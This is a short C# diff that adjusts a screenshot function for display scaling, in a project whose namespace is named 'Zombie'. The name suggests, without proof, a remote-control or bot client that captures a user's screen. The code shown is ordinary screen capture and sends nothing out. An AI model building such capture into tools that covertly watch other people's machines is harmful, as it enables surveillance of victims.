@@ -9,6 +9,8 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Windows;
+using Zombie.Helper;
 
 namespace Zombie.Functions
 {
@@ -19,13 +21,18 @@ namespace Zombie.Functions
         {
             byte[] img;
 
-            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
-                              Screen.PrimaryScreen.Bounds.Height,
+            int screenWidth = (int)(Screen.PrimaryScreen.Bounds.Width * MonitorInfo.CurrentScaling);
+            int screenHeight = (int)(Screen.PrimaryScreen.Bounds.Height * MonitorInfo.CurrentScaling);
+
+
+
+            var bmpScreenshot = new Bitmap(screenWidth,
+                              screenHeight,
                               PixelFormat.Format32bppArgb);
 
             var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
 
-            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
+            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, new Size(screenWidth, screenHeight), CopyPixelOperation.SourceCopy);
 
 
             using (MemoryStream ms = new MemoryStream())
